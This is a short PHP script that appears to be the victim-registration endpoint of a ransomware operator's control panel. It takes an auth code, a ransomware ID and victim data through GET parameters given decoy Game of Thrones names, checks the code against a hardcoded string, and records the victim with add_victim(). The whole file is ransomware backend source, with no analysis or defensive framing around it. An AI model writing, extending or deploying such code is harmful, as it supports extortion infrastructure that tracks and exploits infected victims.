<?php

require_once('auth.php');
require_once('victim_manager/add_victim.php');
#to check for authcode and ransomware_id params in http request
if(isset($_GET['if_i_look_back_i_m_lost'])&&isset($_GET['winter_is_coming'])&&isset($_GET['seven_kingdoms'])){

		$auth_code = $_GET['if_i_look_back_i_m_lost'];  /*Auth Code*/
		$ransomware_id = $_GET['winter_is_coming'];    /*Ransomware ID*/
        $values = $_GET['seven_kingdoms'];

        $auth_result = check_authcode($auth_code);    /*Check Auth Code*/

        #Adding a victim using Ransomware ID	
		if($auth_result==="you_are_your_mothers_trueborn_son_of_lannister"){
				$assoc_result=add_victim($ransomware_id, $values);
				echo $assoc_result;
				}
}
else{
    exit("The_great_war_is_coming");
}
?>
